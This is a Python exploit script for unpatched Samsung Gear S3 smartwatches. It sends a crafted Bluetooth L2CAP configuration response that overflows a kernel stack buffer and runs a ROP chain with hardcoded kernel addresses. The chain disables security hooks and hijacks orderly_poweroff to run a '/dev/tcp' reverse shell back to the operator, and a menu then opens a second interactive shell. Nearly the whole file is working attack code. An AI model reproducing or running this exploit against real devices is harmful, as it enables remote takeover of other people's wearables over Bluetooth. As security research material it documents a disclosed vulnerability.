#!/usr/bin/python
from scapy.layers.bluetooth import *
import binascii
from functools import partial
import sys
from pwn import *
from l2cap_infra.l2cap_infra import create_l2cap_connection, OUR_LOCAL_SCID

# This exploit was developed against *unpatched* Samsung Gear S3
# Running Linux Kernel v3.18
# Tizen Version 2.3.2.1
#
# Inorder for this attack to work against any other (unpatched) Smasung Gear S3 version,
# The ROP chain, and the addresses in the function below need to be adjusted.

# Send are stack overflow, with our ROP chain to the l2cap connection
# And run the 'cmd' in userspace.
def send_stack_overflow_conf_rsp(loop, scid, dcid, cmd):
    # Prepare payload before sending conf req 
    mtu = binascii.unhexlify("0102ffff")
    efs = binascii.unhexlify("0610" + "0000" + ("00" * 0xe))
    Q = partial(struct.pack, "<Q")
    def str_to_quads(s):
        count = (len(s) // 8) + int(len(s) % 8 != 0) 
        return struct.unpack("<" + "Q"*count, s.ljust(count * 8, "\x00"))

    poweroff_cmd_addr = 0xFFFFFFC000C26BB0
    write_content = str_to_quads(cmd) 
    write_addresses = [poweroff_cmd_addr + (i*8) for i in range(len(write_content))]
    payload = ""
    # arrange payload so we exit the 0x80 buffer with a fully controlled address
    payload += (mtu*1 + efs*4)[:-16]
    # ldp conn, x20, [sp,#0x10];
    # ldr len, [sp,#0x20];
    # ldp x29, x30, [sp],#0x30;
    # ret;                     
    payload += Q(0) # just so itll pass the efs check - frame pointer
    payload += Q(0xFFFFFFC0004983EC) #g(0x00418be4 + 8) # return address from recv_acldata
    payload += efs[:8] # x19, has to be efs header
    payload += Q(1000)    # x20 = 1000 for msleep
    payload += efs[-2:] + mtu + mtu[:2] # x21
    payload += mtu[-2:] + mtu + efs[:2] # stack alignment
    for what, where in zip(write_content, write_addresses):
        # ldp x19, x20, [sp, #0x10];
        # ldp x21, x22, [sp, #0x20];
        # ldp x29, x30, [sp], #0x30;
        # ret;  
        payload += Q(0) # x29 
        payload += Q(0xFFFFFFC0004983E8)#g(0x00418be4 + 4) # x30
        payload += efs[:8] # x19
        payload += Q(where - 0x40) # x20 - addr to write minus 0x40
        payload += efs[-2:] + efs[:6] # x21
        payload += Q(what) # x22 - value to write
        # str x22, [x20, #0x40];
        # ldp x19, x20, [sp, #0x10];
        # ldp x21, x22, [sp, #0x20];
        # ldp x29, x30, [sp], #0x30;
        # ret;  
        payload += efs[-4:] + efs[:4] # x29
        payload += Q(0xFFFFFFC0004983EC) #g(0x00418be4 + 8) # x30
        payload += efs[-6:] + mtu[:2] # x19
        payload += mtu[-2:] + mtu + mtu[:2] # x20 
        payload += mtu[-2:] + mtu + mtu[:2] # x21
        payload += mtu[-2:] + mtu + efs[:2] # x22
    # ldp x19, x20, [sp, #0x10];
    # ldp x21, x22, [sp, #0x20];
    # ldp x29, x30, [sp], #0x30;
    # ret;  
    payload += Q(0) # x29 
    payload += Q(0xFFFFFFC00053D140)#g(0x004bd93c + 4) # x30 
    payload += efs[:8] # x19
    payload += Q(0xFFFFFFC000283434) # x20 - reset_security_ops
    payload += efs[-2:] + efs[:6] # x21
    payload += Q(0) # x22
    # blr x20;
    # ldp x19, x20, [sp, #0x10];
    # ldp x21, x22, [sp, #0x20];
    # ldp x29, x30, [sp], #0x30;
    # ret
    payload += efs[-4:] + efs[:4] # x29
    payload += Q(0xFFFFFFC0002C8060) # x30 
    payload += efs[-6:] + mtu[:2] # x19
    payload += mtu[-2:] + mtu + efs[:2] # x20
    payload += Q(0) # x21
    payload += Q(0xFFFFFFC00061D008) # x22 - ret 0
    # blr x22;
    # ldp x19, x20, [sp, #0x10];
    # ldp x21, x22, [sp, #0x20];
    # ldp x29, x30, [sp], #0x30;
    # ret;
    payload += efs[:8] # x29
    payload += Q(0xFFFFFFC00053D140) # x30
    payload += efs[-2:] + efs[:6] # x19
    payload += Q(0xFFFFFFC0000B63B0) # x20 - orderly_poweroff
    payload += efs[-4:] + mtu # x21
    payload += mtu + mtu # x22
    # blr x20;
    # ldp x19, x20, [sp, #0x10];
    # ldp x21, x22, [sp, #0x20];
    # ldp x29, x30, [sp], #0x30;
    # ret
    payload += efs[:8]    
    payload += Q(0xFFFFFFC00053D150) #g(0x00418be4 + 4*5) # x30 - infinite loop
    log.info("Executing command %r" % (cmd,))
    log.info("Total payload length: %d" % len(payload)) 
	
    # Now cause target to be in Pending state using EFS configuration request
    # Note that stype == L2CAP_SERV_NOTRAFIC (0) which is important, which it is in our EFS struct
    conf_req = (L2CAP_Hdr(cid=1) / L2CAP_CmdHdr(id=1) /
                L2CAP_ConfReq(dcid=dcid, flags=0) /
                Raw(efs)) # Send EFS structure to cause pending result
    # Assemble our response
    resp = (L2CAP_Hdr(cid=1) / L2CAP_CmdHdr(id=conf_req.id) /
            L2CAP_ConfResp(scid=dcid, flags=0, result=4) / # result=:Pending
            Raw(payload))
    loop.send(conf_req) 
    loop.cont()
    loop.send(resp)

def main(src_hci, dst_bdaddr, cb_ip, cb_port1=1234, cb_port2=1235):
    # Start an l2cap_connection, without the mutual config process (so we can control and abuse it later on)
    l2cap_loop, dcid = create_l2cap_connection(src_hci, dst_bdaddr, with_mutual_config=False)
    connectback = listen(cb_port1)

    bash_cmd = "/bin/bash -c /bin/bash</dev/tcp/%s/%s" % (cb_ip, cb_port1)

    send_stack_overflow_conf_rsp(l2cap_loop, OUR_LOCAL_SCID, dcid, bash_cmd) # Start the ball rolling!

    connectback.wait_for_connection()
    while connectback.connected():
        action = options("Select an action:", ["Drop into shell", "Quit"])
        if action == 0:
            new_cb = listen(cb_port2)
            connectback.sendline("bash -i</dev/tcp/%s/%s 1>&0 2>&0 & disown" % (cb_ip, new_cb.lport))
            try:
                new_cb.wait_for_connection()
                new_cb.interactive(prompt="")
            except KeyboardInterrupt:
                pass
        elif action == 1:
            log.info("Disconnecting...")
            connectback.close()

def usage(argv):
    print("%s [interface] [target mac] [connectback interface ip] ([connectback port1]) ([connectback port2])" % (argv[0],))
    print("\tRun as root, interface will go down.")
            
if __name__ == '__main__':
    if len(sys.argv) < 3:
        usage(sys.argv)
    else:        
        main(*sys.argv[1:])
